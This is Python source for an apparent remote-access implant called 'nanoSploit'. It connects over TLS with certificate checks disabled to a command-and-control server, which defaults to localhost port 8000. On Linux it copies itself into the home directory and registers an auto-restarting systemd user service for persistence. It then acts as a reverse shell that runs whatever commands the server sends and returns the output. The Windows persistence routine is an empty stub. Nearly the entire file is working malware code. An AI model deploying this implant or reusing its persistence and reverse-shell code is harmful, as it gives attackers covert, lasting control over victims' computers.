import socket
import ssl
import subprocess
import os
import platform
from shutil import copyfile

# Static globals
SYSTEM = platform.system()
LOCK_PATH = "/tmp/nanosploit.lock" if SYSTEM == "Linux" else "C:/temp/nanosploit.lock"
SYSTEMD_UNIT = """[Unit]
Description=nanoSploit
After=network.target

[Service]
ExecStart={0}/.nanosploit
Restart=always
RestartSec=3

[Install]
WantedBy=default.target
"""

''' PERSISTENCE '''


def check_lock() -> bool:
    # Check if the lock file exists
    if os.path.isfile(LOCK_PATH):
        # Get PID from lock file
        with open(LOCK_PATH, 'r') as file:
            pid = file.read().strip()

        # Check if PID is running
        if SYSTEM == 'Windows':
            import ctypes
            kernel32 = ctypes.windll.kernel32
            handle = kernel32.OpenProcess(1, False, int(pid))
            if handle != 0:
                # PID is running
                return True
        elif SYSTEM == "Linux":
            if os.path.exists(f"/proc/{pid}"):
                # PID is running
                return True

    # Create the lock file and write the current PID
    with open(LOCK_PATH, 'w') as file:
        file.write(str(os.getpid()))

    return False


def systemd_service(home_path: str):
    user_service_path = f"{home_path}/.config/systemd/user"

    # Creat systemd service directory
    if not os.path.exists(user_service_path):
        os.makedirs(user_service_path)

    # Write service file
    with open(f"{user_service_path}/nanosploit.service", "w") as f:
        f.write(SYSTEMD_UNIT.format(home_path))

    os.system("systemctl --user enable nanosploit")
    os.system("systemctl --user start nanosploit")

    print("Successfully set systemd service !")


def persistence_linux():
    home_path = os.getenv("HOME")
    payload_path = f"{home_path}/.nanosploit"

    if not os.path.exists(payload_path):
        os.system(f"cp {__file__} {payload_path}")

    # Run persistence
    systemd_service(home_path)


def persistence_windows():
    pass


''' REVERSE SHELL '''


def reverse_shell(ss: ssl.SSLSocket):
    while True:
        # Send 'user:cwd' to server for prompt
        ss.send(b":".join((os.getlogin().encode(), os.getcwd().encode())))

        buffer = ss.recv()
        if buffer:
            # Get command from server
            buffer_arr = buffer.decode().split(" ")

            match buffer_arr[0]:
                case "cd":
                    # Change current directory
                    if len(buffer_arr) < 2:
                        ss.send(b"Missing argument")
                    else:
                        try:
                            os.chdir(buffer_arr[1])
                            ss.send(f"Moved to '{buffer_arr[1]}'".encode())
                        except Exception as e:
                            ss.send(str(e).encode())
                case "exit":
                    # Exit reverse shell
                    break
                case _:
                    # Execute command
                    output = subprocess.run(buffer.decode(), shell=True, capture_output=True, text=True)
                    ss.send(output.stdout.encode() + output.stderr.encode())


''' SECURE SOCKET '''


def init_connection() -> ssl.SSLSocket:
    # Create socket with ssl
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    ss = context.wrap_socket(s)

    # Connect to C2 server
    global HOST, PORT
    if "HOST" not in globals() and "PORT" not in globals():
        HOST, PORT = "127.0.0.1", 8000
    ss.connect((HOST, PORT))

    return ss


def process_instructions(ss: ssl.SSLSocket):
    while True:
        buffer = ss.recv()
        if buffer:
            match buffer:
                case b"ping":
                    ss.send(b"pong")
                case b"shell":
                    reverse_shell(ss)
                case b"persistence":
                    # TODO: return persistence status
                    pass
                case _:
                    print(f"Unknown command received: '{buffer.decode()}'")
                    ss.send(b"unknown")
        else:
            print("Lost server connection, exiting...")
            break


''' MAIN '''


def main():
    # Exit if already running
    if check_lock():
        print("Already running, exiting...")
        return
    print("Lock is free !")

    # Persistence
    print("Start persistence...")
    if platform.system() == "Linux":
        persistence_linux()
    elif platform.system() == "Windows":
        persistence_windows()
    print("Finished persistence !")

    # Start secure connection with C2
    ss = init_connection()
    print("Successfully connected to C2 server !")

    # Handle server commands
    print("Start listening for server instructions...")
    process_instructions(ss)

    # Exit program and delete lock file
    os.system(f"rm {LOCK_PATH}")
    exit(0)


if __name__ == "__main__":
    main()
